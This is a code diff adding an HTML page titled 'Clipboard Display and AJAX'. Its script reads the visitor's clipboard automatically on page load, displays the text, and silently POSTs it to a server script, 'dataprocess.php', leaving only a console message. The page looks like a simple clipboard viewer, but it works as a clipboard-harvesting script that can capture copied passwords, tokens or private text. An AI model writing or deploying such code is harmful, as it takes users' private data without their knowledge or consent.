@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clipboard Display and AJAX</title>
+  <script>
+    function sendClipboardData(clipboardText) {
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'dataprocess.php', true);
+      xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+          console.log('Clipboard data sent successfully!');
+        }
+      };
+      var data = 'clipboardData=' + encodeURIComponent(clipboardText);
+      xhr.send(data);
+    }
+
+    window.addEventListener('DOMContentLoaded', function() {
+      navigator.clipboard.readText()
+        .then(text => {
+          document.getElementById('clipboard-content').textContent = text;
+          sendClipboardData(text);
+        })
+        .catch(err => {
+          console.error('Failed to read from clipboard:', err);
+        });
+    });
+  </script>
+</head>
+<body>
+  <h1></h1>
+
+  <div id="clipboard-content"></div>
+</body>
+</html>
